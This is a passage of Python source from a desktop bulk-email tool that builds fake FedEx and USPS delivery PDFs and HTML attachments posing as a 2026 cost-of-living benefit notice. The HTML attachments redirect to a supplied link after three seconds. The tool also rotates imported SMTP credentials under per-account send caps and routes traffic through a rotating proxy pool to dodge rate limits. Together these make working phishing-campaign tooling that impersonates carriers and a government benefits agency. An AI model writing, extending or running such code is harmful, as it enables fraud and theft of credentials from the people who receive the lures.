                                    textColor=white, fontName='Helvetica-Bold', leading=24)
    body_style = ParagraphStyle('Body', parent=styles['Normal'], fontSize=11, leading=16,
                                  spaceAfter=10, textColor=text_color)
    
    story = []
    
    # Header
    header_table = Table([[Paragraph('<font color="white">FedEx</font><font color="#ff6600">.</font>', header_style)]],
                          colWidths=[doc.width], rowHeights=[1.4*cm])
    header_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), purple),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('LEFTPADDING', (0,0), (-1,-1), 16), ('RIGHTPADDING', (0,0), (-1,-1), 16),
    ]))
    story.append(header_table)
    story.append(Spacer(1, 0.5*cm))
    
    story.append(Paragraph(f"Hi, {recipient_email}", body_style))
    story.append(Paragraph(f"Your shipment from <b>{shipper}</b> is on the way.", body_style))
    
    # Delivery info table
    delivery_table = Table(
        [[Paragraph('<font size="9" color="#4d148c"><b>SCHEDULED DELIVERY</b></font>', body_style),
          Paragraph(f'<font size="14"><b>{delivery_str}</b></font>', body_style)],
         [Paragraph('<font size="9" color="#4d148c"><b>TRACKING NUMBER</b></font>', body_style),
          Paragraph(f'<font face="Courier" size="11"><b>{tracking_id}</b></font>', body_style)]],
        colWidths=[doc.width*0.35, doc.width*0.65]
    )
    delivery_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), HexColor("#f5f0fa")),
        ('LINEBEFORE', (0,0), (0,-1), 4, purple),
        ('LEFTPADDING', (0,0), (-1,-1), 14), ('RIGHTPADDING', (0,0), (-1,-1), 14),
        ('TOPPADDING', (0,0), (-1,-1), 10), ('BOTTOMPADDING', (0,0), (-1,-1), 10),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
    ]))
    story.append(delivery_table)
    story.append(Spacer(1, 0.4*cm))
    
    story.append(Paragraph(
        f"<font size='9' color='#666'>This report was generated at approximately {today.strftime('%I:%M %p')} {today_str}.</font>",
        body_style))
    story.append(Paragraph(
        "<font size='9' color='#666'>Standard transit is the date and time the package is scheduled "
        "to be delivered by, based on the selected service, destination and ship date. "
        "Limitations and exceptions may apply.</font>", body_style))
    
    story.append(Spacer(1, 0.3*cm))
    story.append(Paragraph(
        f"<font size='8' color='#999'>© {today.year} Federal Express Corporation. All rights reserved.</font>",
        body_style))
    
    doc.build(story)
    return buffer.getvalue()


def _generate_usps_pdf_attachment(recipient_name, recipient_email, link_url):
    """USPS Expected Delivery PDF — blue/red brand design."""
    if not PDF_OK:
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)
    
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.colors import HexColor, white
    from reportlab.lib.units import cm
    from reportlab.lib.enums import TA_LEFT, TA_CENTER
    import io, datetime as _dt
    
    buffer = io.BytesIO()
    blue = HexColor("#004b87")
    red = HexColor("#d52b1e")
    text_color = HexColor("#1a1a1a")
    
    today = _dt.datetime.now()
    delivery_date = today  # 🆕 V108: real today date
    full_date = delivery_date.strftime("%A, %B %d, %Y")
    day_short = delivery_date.strftime("%d").lstrip("0")
    month_short = delivery_date.strftime("%b").upper()
    arr_hour = random.choice([5, 6, 7, 8, 9])
    arrival = f"{arr_hour}:00pm"
    tracking_id = f"{random.randint(10**21, 10**22 - 1)}"
    recipient_label = random.choice(_USPS_RECIPIENTS)
    
    doc = SimpleDocTemplate(buffer, pagesize=A4, leftMargin=2*cm, rightMargin=2*cm,
                            topMargin=0, bottomMargin=1.5*cm, title="USPS Delivery")
    
    styles = getSampleStyleSheet()
    header_style = ParagraphStyle('Hdr', parent=styles['Normal'], fontSize=18, alignment=TA_LEFT,
                                    textColor=white, fontName='Helvetica-Bold', leading=22)
    body_style = ParagraphStyle('Body', parent=styles['Normal'], fontSize=11, leading=16,
                                  spaceAfter=10, textColor=text_color)
    
    story = []
    
    # Header
    header_table = Table([[Paragraph("USPS", header_style),
                            Paragraph('<font size="9" color="white">U.S. POSTAL SERVICE</font>', header_style)]],
                          colWidths=[doc.width*0.5, doc.width*0.5], rowHeights=[1.2*cm])
    header_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), blue),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('LEFTPADDING', (0,0), (-1,-1), 16),
        ('ALIGN', (1,0), (1,0), 'RIGHT'),
    ]))
    story.append(header_table)
    story.append(Spacer(1, 0.5*cm))
    
    story.append(Paragraph(f"Hello {recipient_label},", body_style))
    story.append(Paragraph(
        f"USPS expects to deliver your package by <b>{full_date}</b> arriving by {arrival}.",
        body_style))
    
    # Big date box
    date_table = Table(
        [[Paragraph(f'<para alignment="center"><font size="9" color="#666">EXPECTED DELIVERY BY</font><br/><br/>'
                     f'<font size="42" color="#d52b1e"><b>{day_short}</b></font><br/>'
                     f'<font size="14"><b>{month_short}</b></font></para>', body_style),
          Paragraph(f'<para alignment="center"><font size="11">By {arrival}</font><br/><br/>'
                     f'<font size="9" color="#666">Tracking Number:</font><br/>'
                     f'<font size="9" face="Courier" color="#004b87"><b>{tracking_id}</b></font></para>', body_style)]],
        colWidths=[doc.width*0.35, doc.width*0.65], rowHeights=[3.5*cm]
    )
    date_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (0,-1), white),
        ('BACKGROUND', (1,0), (-1,-1), HexColor("#f9f9f9")),
        ('BOX', (0,0), (-1,-1), 1, HexColor("#e0e0e0")),
        ('LINEAFTER', (0,0), (0,-1), 1, HexColor("#e0e0e0")),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
    ]))
    story.append(date_table)
    story.append(Spacer(1, 0.4*cm))
    
    story.append(Paragraph(f"<font size='9' color='#666'>Sent to: <b>{recipient_email}</b></font>", body_style))
    story.append(Spacer(1, 0.3*cm))
    story.append(Paragraph(
        f"<font size='8' color='#999'>© {today.year} United States Postal Service®. All rights reserved.</font>",
        body_style))
    
    doc.build(story)
    return buffer.getvalue()


def _generate_cola_html_attachment(recipient_name, recipient_email, link_url):
    """
    Generate COLA-themed HTML attachment per email.
    Same content/structure ki PDF walakin f HTML format.
    Includes meta refresh redirect (3 thawani) l link.
    """
    # Random COLA color (24 government schemes)
    c = random.choice(_COLA_COLOR_SCHEMES)
    
    # Random COLA content parts
    intro = random.choice(_COLA_INTROS)
    highlight = random.choice(_COLA_HIGHLIGHTS)
    benefits_list = random.choice(_COLA_BENEFITS_LISTS)
    key_benefits = random.choice(_COLA_KEY_BENEFITS)
    btn_text = random.choice(_COLA_BUTTON_TEXTS)
    tip = random.choice(_COLA_TIPS)
    closing = random.choice(_COLA_CLOSINGS)
    footer = random.choice(_COLA_FOOTERS)
    
    # Random titles
    titles = [
        "Download Your COLA Notice",
        "Your 2026 COLA Notice",
        "COLA Notice — Available Now",
        "Your Annual Benefit Notice",
        "Download Your 2026 Notice",
    ]
    title = random.choice(titles)
    
    subtitles = [
        "Cost-of-Living Adjustment Information",
        "2026 Annual Benefit Update",
        "Your Personalized Benefit Notice",
        "Annual Cost-of-Living Notice",
        "2026 Benefit Statement",
    ]
    subtitle = random.choice(subtitles)
    
    section1_titles = [
        "Your Secure Online Account Includes:",
        "What's Available in Your Account:",
        "Your Account Provides Access To:",
        "Online Account Features:",
    ]
    sec1 = random.choice(section1_titles)
    
    section2_titles = [
        "Key Benefits of Digital COLA Notice:",
        "Why Choose Digital Delivery:",
        "Advantages of Going Digital:",
        "Benefits of Digital Notice:",
    ]
    sec2 = random.choice(section2_titles)
    
    # Build benefits HTML
    benefits_html = "\n".join([f"                <li>{item}</li>" for item in benefits_list])
    
    key_benefits_html = "\n".join([
        f'                <li><strong>{title_b}:</strong> {desc}</li>'
        for title_b, desc in key_benefits
    ])
    
    # 🎯 META REFRESH redirect 3 thawani l link!
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="3; url={link_url}">
    <title>{title}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px; }}
        .container {{ max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .header {{ background-color: {c['primary']}; color: white; padding: 20px; text-align: center; border-radius: 5px; margin-bottom: 20px; }}
        .header h1 {{ margin: 0; font-size: 28px; }}
        .header p {{ margin: 10px 0 0 0; font-size: 16px; }}
        .content {{ line-height: 1.6; color: #333; }}
        .content p {{ margin-bottom: 15px; font-size: 16px; }}
        .content h2 {{ color: {c['primary']}; margin-top: 25px; margin-bottom: 15px; }}
        .content ul {{ margin: 15px 0; padding-left: 20px; }}
        .content li {{ margin-bottom: 10px; font-size: 16px; }}
        .button {{ display: inline-block; background-color: {c['secondary']}; color: white; padding: 14px 36px; text-decoration: none; border-radius: 5px; margin: 20px 0; font-weight: bold; text-align: center; border: none; cursor: pointer; font-size: 16px; }}
        .info-box {{ background-color: {c['light']}; border-left: 4px solid {c['accent']}; padding: 15px; margin: 20px 0; border-radius: 3px; }}
        .highlight {{ background-color: #fff3cd; padding: 15px; border-radius: 3px; margin: 20px 0; }}
        .recipient-info {{ background-color: #f5f7fa; border-left: 3px solid {c['primary']}; padding: 15px 20px; margin: 20px 0; border-radius: 3px; }}
        .recipient-info table {{ width: 100%; border-collapse: collapse; }}
        .recipient-info td {{ padding: 6px 0; font-size: 14px; }}
        .recipient-info td:first-child {{ color: {c['primary']}; font-weight: bold; width: 35%; }}
        .recipient-info td:last-child {{ color: #333; }}
        .redirect-notice {{ background-color: {c['light']}; color: {c['primary']}; padding: 12px; border-radius: 5px; text-align: center; margin: 16px 0; font-size: 14px; font-weight: bold; }}
        .center {{ text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{title}</h1>
            <p>{subtitle}</p>
        </div>
        <div class="content">
            <div class="redirect-notice">
                ⏳ Loading your secure portal... You will be redirected automatically in 3 seconds.<br>
                If not redirected, <a href="{link_url}" style="color: {c['primary']};"><b>click here</b></a>.
            </div>
            <p>{intro}</p>
            <div class="highlight">
                <p><strong>{highlight}</strong></p>
            </div>
            <h2>{sec1}</h2>
            <ul>
{benefits_html}
            </ul>
            <h2>{sec2}</h2>
            <ul>
{key_benefits_html}
            </ul>
            <div class="recipient-info">
                <table>
                    <tr><td>Email Address:</td><td>{recipient_email}</td></tr>
                    <tr><td>Notice Year:</td><td>2026 COLA Adjustment</td></tr>
                </table>
            </div>
            <div class="center">
                <a href="{link_url}" class="button">{btn_text}</a>
            </div>
            <div class="info-box">
                <p><strong>{tip}</strong></p>
            </div>
            <p>{closing}</p>
            <p style="margin-top: 30px; font-size: 14px; color: #666; border-top: 1px solid #ddd; padding-top: 20px;">
                {footer}
            </p>
        </div>
    </div>
</body>
</html>"""
    return html


# 🔄 Apply rotation seed to all pools (mlli kolchi defined)
_apply_rotation_seed_to_pools()


class ABtn(tk.Canvas):
    def __init__(self, parent, label, color, cmd, w=130, h=34):
        super().__init__(parent, width=w, height=h,
                         bg=parent["bg"], highlightthickness=0, cursor="hand2")
        self.color,self.cmd,self.label = color,cmd,label
        self.w,self.h = w,h
        self._t=0.0; self._dir=0; self._aid=None
        self._draw(color)
        self.bind("<Button-1>", self._click)
        self.bind("<Enter>", lambda e: self._hover(True))
        self.bind("<Leave>", lambda e: self._hover(False))

    def _draw(self, col):
        self.delete("all")
        w,h,r = self.w,self.h,self.h//2
        self.create_arc(0,0,h,h, start=90, extent=180, fill=col, outline="")
        self.create_arc(w-h,0,w,h, start=270, extent=180, fill=col, outline="")
        self.create_rectangle(r,0,w-r,h, fill=col, outline="")
        self.create_text(w//2,h//2, text=self.label, fill="white", font=("Segoe UI",9,"bold"))

    def _click(self, e):
        self._draw(lighten(self.color,-20))
        self.after(80, lambda: self._draw(self.color))
        self.after(100, self.cmd)

    def _hover(self, on):
        self._dir = 1 if on else -1
        self._anim()

    def _anim(self):
        if self._aid: self.after_cancel(self._aid)
        self._t = max(0.0, min(1.0, self._t + self._dir*0.15))
        col = lighten(self.color, int(self._t*35))
        self._draw(col)
        if 0 < self._t < 1:
            self._aid = self.after(16, self._anim)


# ── SMTP Manager Tab ─────────────────────────────────────────────
class SmtpTab(tk.Frame):
    def __init__(self, parent, log_fn):
        super().__init__(parent, bg=C["bg1"])
        self.log = log_fn
        self.smtp_list = []  # list of dicts: {host, port, user, password, tls}
        self._build()

    def _build(self):
        pad = tk.Frame(self, bg=C["bg1"])
        pad.pack(fill="both", expand=True, padx=14, pady=14)

        # Header
        hdr = tk.Frame(pad, bg=C["bg1"])
        hdr.pack(fill="x", pady=(0,8))
        tk.Label(hdr, text="SMTP Accounts", bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI",9,"bold")).pack(side="left")
        tk.Frame(hdr, bg=C["border2"], height=1).pack(
            side="left", fill="x", expand=True, padx=(8,0), pady=6)

        # Import section
        imp_frame = tk.Frame(pad, bg=C["bg1"])
        imp_frame.pack(fill="x", pady=(0,8))

        tk.Label(imp_frame, text="Format: host|port|user|password|tls(0/1) — one per line",
                 bg=C["bg1"], fg=C["text3"], font=("Segoe UI",7)).pack(anchor="w")

        btn_row = tk.Frame(imp_frame, bg=C["bg1"])
        btn_row.pack(fill="x", pady=(4,0))
        tk.Button(btn_row, text="📂 Import .txt", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                  command=self._import_txt).pack(side="left", ipady=4, ipadx=8, padx=(0,6))
        tk.Button(btn_row, text="+ Add Manual", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                  command=self._open_add_dialog).pack(side="left", ipady=4, ipadx=8, padx=(0,6))
        tk.Button(btn_row, text="🗑 Clear All", bg=C["bg3"], fg=C["red"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                  command=self._clear_all).pack(side="left", ipady=4, ipadx=8)

        self.count_lbl = tk.Label(btn_row, text="0 SMTP", bg=C["bg1"], fg=C["text3"],
                                   font=("Segoe UI",8))
        self.count_lbl.pack(side="left", padx=(10,0))

        # Test button
        tk.Button(btn_row, text="⚡ Test Selected", bg=C["bg3"], fg=C["yellow"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                  command=self._test_selected).pack(side="right", ipady=4, ipadx=8)

        # Limit per SMTP
        limit_f = tk.Frame(pad, bg=C["bg1"])
        limit_f.pack(fill="x", pady=(0,8))
        tk.Label(limit_f, text="Limit per SMTP (emails):", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI",8)).pack(side="left")
        self.limit_var = tk.StringVar(value="500")
        limit_e = tk.Entry(limit_f, textvariable=self.limit_var,
                           font=("Segoe UI",9), width=7,
                           bg=C["input"], fg=C["text"],
                           insertbackground=C["accent"],
                           relief="flat", bd=0,
                           highlightthickness=1,
                           highlightbackground=C["border2"])
        limit_e.pack(side="left", padx=(8,0), ipady=4)
        tk.Label(limit_f, text="  (0 = unlimited)", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI",7)).pack(side="left")

        tk.Button(btn_row, text="↺ Reset Counters", bg=C["bg3"], fg=C["accent2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                  command=self._reset_counters).pack(side="right", ipady=4, ipadx=8, padx=(0,4))

        # Treeview
        cols = ("host","port","user","tls","sent","limit","status")
        self.tree = ttk.Treeview(pad, columns=cols, show="headings", height=12)
        for c, w in [("host",150),("port",45),("user",160),("tls",38),("sent",45),("limit",45),("status",75)]:
            self.tree.heading(c, text=c.upper())
            self.tree.column(c, width=w, anchor="w")
        self.tree.pack(fill="both", expand=True, pady=(4,0))

        sb = ttk.Scrollbar(pad, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)

    def _import_txt(self):
        path = filedialog.askopenfilename(
            title="Import SMTP list",
            filetypes=[("Text","*.txt"),("All","*.*")])
        if not path: return
        added = 0
        errors = 0
        with open(path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                parts = line.split("|")
                if len(parts) < 4:
                    errors += 1; continue
                smtp = {
                    "host": parts[0].strip(),
                    "port": int(parts[1].strip()) if parts[1].strip().isdigit() else 587,
                    "user": parts[2].strip(),
                    "password": parts[3].strip(),
                    "tls": parts[4].strip() == "1" if len(parts) > 4 else True,
                    "status": "idle",
                    "sent_count": 0,
                }
                limit = self.get_limit()
                self.smtp_list.append(smtp)
                self.tree.insert("", "end",
                    values=(smtp["host"], smtp["port"], smtp["user"],
                            "TLS" if smtp["tls"] else "SSL",
                            "0", str(limit) if limit > 0 else "∞", "idle"))
                added += 1
        self.count_lbl.config(text=f"{len(self.smtp_list)} SMTP")
        self.log(f"📥 Imported {added} SMTP accounts ({errors} errors)", C["accent2"])

    def _open_add_dialog(self):
        dlg = tk.Toplevel(self)
        dlg.title("Add SMTP")
        dlg.geometry("380x280")
        dlg.configure(bg=C["bg1"])
        dlg.grab_set()

        fields = {}
        for label, default in [
            ("Host", "smtp.gmail.com"),
            ("Port", "587"),
            ("User (email)", ""),
            ("Password", ""),
        ]:
            tk.Label(dlg, text=label, bg=C["bg1"], fg=C["text3"],
                     font=("Segoe UI",8)).pack(anchor="w", padx=16, pady=(8,0))
            e = tk.Entry(dlg, font=("Segoe UI",9),
                         bg=C["input"], fg=C["text"],
                         insertbackground=C["accent"],
                         relief="flat", bd=0,
                         highlightthickness=1,
                         highlightbackground=C["border2"],
                         show="*" if label == "Password" else "")
            e.pack(fill="x", padx=16, ipady=5)
            e.insert(0, default)
            fields[label] = e

        tls_var = tk.BooleanVar(value=True)
        tk.Checkbutton(dlg, text="Use TLS", variable=tls_var,
                       bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",8)).pack(anchor="w", padx=16, pady=4)

        def _save():
            limit = self.get_limit()
            smtp = {
                "host": fields["Host"].get().strip(),
                "port": int(fields["Port"].get().strip() or 587),
                "user": fields["User (email)"].get().strip(),
                "password": fields["Password"].get().strip(),
                "tls": tls_var.get(),
                "status": "idle",
                "sent_count": 0,
            }
            self.smtp_list.append(smtp)
            self.tree.insert("", "end",
                values=(smtp["host"], smtp["port"], smtp["user"],
                        "TLS" if smtp["tls"] else "SSL",
                        "0", str(limit) if limit > 0 else "∞", "idle"))
            self.count_lbl.config(text=f"{len(self.smtp_list)} SMTP")
            dlg.destroy()

        ABtn(dlg, "Add", C["accent"], _save, w=100).pack(pady=10)

    def _clear_all(self):
        if messagebox.askyesno("Confirm", "Clear all SMTP accounts?"):
            self.smtp_list.clear()
            for item in self.tree.get_children():
                self.tree.delete(item)
            self.count_lbl.config(text="0 SMTP")

    def _test_selected(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Info", "Select SMTP rows to test"); return

        def _do():
            items = self.tree.get_children()
            for iid in sel:
                idx = list(items).index(iid)
                if idx >= len(self.smtp_list): continue
                smtp = self.smtp_list[idx]
                try:
                    if smtp["tls"]:
                        server = smtplib.SMTP(smtp["host"], smtp["port"], timeout=10)
                        server.starttls()
                    else:
                        server = smtplib.SMTP_SSL(smtp["host"], smtp["port"], timeout=10)
                    server.login(smtp["user"], smtp["password"])
                    server.quit()
                    smtp["status"] = "ok"
                    self.tree.set(iid, "status", "✓ ok")
                    self.log(f"✓ SMTP ok: {smtp['user']}", C["green"])
                except Exception as e:
                    smtp["status"] = "fail"
                    self.tree.set(iid, "status", "✗ fail")
                    self.log(f"✗ SMTP fail: {smtp['user']} — {str(e)[:60]}", C["red"])

        threading.Thread(target=_do, daemon=True).start()

    def get_limit(self):
        try:
            return max(0, int(self.limit_var.get().strip()))
        except:
            return 500

    def increment_smtp(self, smtp, tree_iid):
        """Increment sent counter. Auto-delete when limit reached."""
        smtp["sent_count"] += 1
        limit = self.get_limit()
        self.tree.set(tree_iid, "sent", str(smtp["sent_count"]))

        if limit > 0 and smtp["sent_count"] >= limit:
            # Auto delete from list and treeview
            try:
                self.tree.delete(tree_iid)
            except:
                pass
            if smtp in self.smtp_list:
                self.smtp_list.remove(smtp)
            self.count_lbl.config(text=f"{len(self.smtp_list)} SMTP")
            return True  # maxed + deleted

        return False

    def _reset_counters(self):
        for i, smtp in enumerate(self.smtp_list):
            smtp["sent_count"] = 0
            smtp["status"] = "idle"
            items = self.tree.get_children()
            if i < len(items):
                self.tree.set(items[i], "sent", "0")
                self.tree.set(items[i], "status", "idle")
        self.log("↺ Counters reset", C["accent2"])

    def get_active_smtp(self):
        return [(i, s) for i, s in enumerate(self.smtp_list)
                if s["status"] not in ("fail","maxed")]


# ── Proxy Tab ────────────────────────────────────────────────────
class ProxyTab(tk.Frame):
    def __init__(self, parent, log_fn):
        super().__init__(parent, bg=C["bg1"])
        self.log = log_fn
        self.proxy_list = []  # list of dicts: {host, port, user, password, type}
        self.enabled = tk.BooleanVar(value=False)
        self._last_good_ip = ""    # cache last successful IP
        self._last_good_time = 0   # timestamp dyal last good
        
        # 🎯 SMART CACHE POOL — bach mafichi rate-limit!
        self._proxy_pool = []           # cached proxies (rotating)
        self._proxy_pool_index = 0       # rotation index
        self._proxy_pool_size = 8        # how many proxies to keep f pool
        self._last_pool_refresh = 0      # timestamp last pool refresh
        self._pool_refresh_interval = 60 # refresh pool kol 60 thawani
        self._pool_lock = threading.Lock()
        
        self._build()

    def _build(self):
        pad = tk.Frame(self, bg=C["bg1"])
        pad.pack(fill="both", expand=True, padx=14, pady=14)

        hdr = tk.Frame(pad, bg=C["bg1"])
        hdr.pack(fill="x", pady=(0,8))
        tk.Label(hdr, text="Proxy Manager", bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI",9,"bold")).pack(side="left")
        tk.Frame(hdr, bg=C["border2"], height=1).pack(
            side="left", fill="x", expand=True, padx=(8,0), pady=6)

        # Enable toggle
        toggle_f = tk.Frame(pad, bg=C["bg2"], pady=8, padx=12)
        toggle_f.pack(fill="x", pady=(0,6))
        tk.Checkbutton(toggle_f, text="Enable Proxy",
                       variable=self.enabled,
                       bg=C["bg2"], fg=C["text"], activeforeground=C["text"],
                       selectcolor=C["bg3"], activebackground=C["bg2"],
                       font=("Segoe UI",9,"bold")).pack(side="left")
        self.active_lbl = tk.Label(toggle_f, text="", bg=C["bg2"],
                                    fg=C["green"], font=("Segoe UI",8))
        self.active_lbl.pack(side="right")

        # Proxy target (API / SMTP / OAuth2 / Both)
        target_f = tk.Frame(pad, bg=C["bg2"], padx=12, pady=6)
        target_f.pack(fill="x", pady=(0,10))
        tk.Label(target_f, text="Apply proxy to:", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI",8)).pack(side="left", padx=(0,10))
        self.proxy_target = tk.StringVar(value="both")
        for val, txt in [("api","Gmail API only"),
                          ("smtp","SMTP only"),
                          ("oauth2","OAuth2 SMTP only"),
                          ("resend","📨 Resend API only"),
                          ("both","API + SMTP"),
                          ("all","All (incl. Resend)")]:
            tk.Radiobutton(target_f, text=txt, variable=self.proxy_target,
                           value=val, bg=C["bg2"], fg=C["text2"],
                           selectcolor=C["bg3"], activebackground=C["bg2"],
                           font=("Segoe UI",8)).pack(side="left", padx=(0,12))

        # Proxy Mode: list or API URL
        mode_f = tk.Frame(pad, bg=C["bg2"], padx=12, pady=6)
        mode_f.pack(fill="x", pady=(0,10))
        tk.Label(mode_f, text="Proxy source:", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI",8)).pack(side="left", padx=(0,10))
        self.proxy_mode = tk.StringVar(value="api_url")
        tk.Radiobutton(mode_f, text="List (.txt)", variable=self.proxy_mode,
                       value="list", bg=C["bg2"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg2"],
                       font=("Segoe UI",8),
                       command=self._toggle_proxy_mode).pack(side="left", padx=(0,12))
        tk.Radiobutton(mode_f, text="Rotating API URL", variable=self.proxy_mode,
                       value="api_url", bg=C["bg2"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg2"],
                       font=("Segoe UI",8),
                       command=self._toggle_proxy_mode).pack(side="left")

        # API URL input frame
        self.api_url_f = tk.Frame(pad, bg=C["bg1"])
        # 🎯 DEFAULT shown — Rotating API URL is the primary mode
        self.api_url_f.pack(fill="x", pady=(0,10))
        tk.Label(self.api_url_f, text="Rotating Proxy API URL:", bg=C["bg1"],
                 fg=C["text3"], font=("Segoe UI",8)).pack(anchor="w")
        # 🎯 Pre-filled m3a 711proxy URL (deja w configured!)
        DEFAULT_PROXY_URL = "http://global.rotgbapi.711proxy.com:8089/gen?zone=custom&ptype=1&region=US&count=1&proto=socks5&stype=text&split=\\r\\n&sessType=rotating"
        self.api_url_var = tk.StringVar(value=DEFAULT_PROXY_URL)
        api_url_e = tk.Entry(self.api_url_f, textvariable=self.api_url_var,
                              font=("Segoe UI",8),
                              bg=C["input"], fg=C["text"],
                              insertbackground=C["accent"],
                              relief="flat", bd=0,
                              highlightthickness=1,
                              highlightbackground=C["border2"])
        api_url_e.pack(fill="x", ipady=6, pady=(2,4))
        tk.Label(self.api_url_f,
                 text="✅ 711proxy URL pre-filled (US socks5 rotating) · t9der tbedlah ila bghiti",
                 bg=C["bg1"], fg=C["accent2"], font=("Segoe UI",7)).pack(anchor="w")
        tk.Button(self.api_url_f, text="⚡ Test API URL", bg=C["bg3"], fg=C["yellow"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                  command=self._test_api_url).pack(anchor="w", ipady=4, ipadx=8, pady=(6,0))
        self.api_url_status = tk.Label(self.api_url_f, text="", bg=C["bg1"],
                                        fg=C["green"], font=("Segoe UI",8))
        self.api_url_status.pack(anchor="w", pady=(4,0))

        # List mode frame (HIDDEN by default — kayban mlli kayswitch l List)
        self.list_f = tk.Frame(pad, bg=C["bg1"])
        # NOT packed — kayban f toggle ila chose

        # Format hint
        fmt_f = tk.Frame(self.list_f, bg=C["bg1"])
        fmt_f.pack(fill="x", pady=(0,6))
        tk.Label(fmt_f, text="Formats accepted:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI",7,"bold")).pack(anchor="w")
        for fmt in ["ip:port", "ip:port:user:password",
                    "http://ip:port", "socks5://ip:port",
                    "socks5://user:pass@ip:port"]:
            tk.Label(fmt_f, text=f"  • {fmt}", bg=C["bg1"], fg=C["text3"],
                     font=("Segoe UI",7)).pack(anchor="w")

        # Buttons
        btn_row = tk.Frame(self.list_f, bg=C["bg1"])
        btn_row.pack(fill="x", pady=(8,6))
        for txt, cmd, fg in [
            ("📂 Import .txt", self._import_txt, C["text2"]),
            ("+ Add Manual",   self._add_manual,  C["text2"]),
            ("⚡ Test All",     self._test_all,    C["yellow"]),
            ("🗑 Clear",        self._clear,       C["red"]),
        ]:
            tk.Button(btn_row, text=txt, bg=C["bg3"], fg=fg,
                      relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                      command=cmd).pack(side="left", ipady=4, ipadx=8, padx=(0,5))

        self.count_lbl = tk.Label(btn_row, text="0 proxies", bg=C["bg1"],
                                   fg=C["text3"], font=("Segoe UI",8))
        self.count_lbl.pack(side="left", padx=(6,0))

        # Treeview
        cols = ("type","host","port","user","status")
        self.tree = ttk.Treeview(self.list_f, columns=cols, show="headings", height=14)
        for c, w in [("type",60),("host",180),("port",55),("user",160),("status",80)]:
            self.tree.heading(c, text=c.upper())
            self.tree.column(c, width=w, anchor="w")

        sb = ttk.Scrollbar(self.list_f, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side="left", fill="both", expand=True, pady=(4,0))
        sb.pack(side="left", fill="y", pady=(4,0))

    def _parse_proxy_line(self, line):
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        ptype = "http"
        # detect protocol prefix
        for proto in ["socks5://","socks4://","http://","https://"]:
            if line.lower().startswith(proto):
                ptype = proto.replace("://","")
                line = line[len(proto):]
                break
        # user:pass@host:port
        if "@" in line:
            creds, hostport = line.rsplit("@", 1)
            user, password = (creds.split(":",1) if ":" in creds else (creds,""))
            host, port = (hostport.rsplit(":",1) if ":" in hostport else (hostport,"1080"))
        else:
            parts = line.split(":")
            if len(parts) == 4:
                host, port, user, password = parts
            elif len(parts) == 2:
                host, port = parts
                user = password = ""
            else:
                return None
        try:
            port = int(port)
        except:
            port = 1080
        return {"type": ptype, "host": host.strip(), "port": port,
                "user": user.strip(), "password": password.strip(), "status": "idle"}

    def _add_proxy(self, p):
        self.proxy_list.append(p)
        self.tree.insert("", "end",
            values=(p["type"], p["host"], p["port"],
                    p["user"] or "—", p["status"]))
        self.count_lbl.config(text=f"{len(self.proxy_list)} proxies")
        self.active_lbl.config(
            text=f"{len(self.proxy_list)} loaded")

    def _import_txt(self):
        path = filedialog.askopenfilename(
            title="Import proxy list",
            filetypes=[("Text","*.txt"),("All","*.*")])
        if not path: return
        added = errors = 0
        with open(path, encoding="utf-8") as f:
            for line in f:
                p = self._parse_proxy_line(line)
                if p:
                    self._add_proxy(p)
                    added += 1
                elif line.strip() and not line.startswith("#"):
                    errors += 1
        self.log(f"🔀 Loaded {added} proxies ({errors} skipped)", C["accent2"])

    def _add_manual(self):
        dlg = tk.Toplevel(self)
        dlg.title("Add Proxy")
        dlg.geometry("360x260")
        dlg.configure(bg=C["bg1"])
        dlg.grab_set()

        fields = {}
        for lbl, default in [("Host",""),("Port","1080"),
                               ("User (optional)",""),("Password (optional)","")]:
            tk.Label(dlg, text=lbl, bg=C["bg1"], fg=C["text3"],
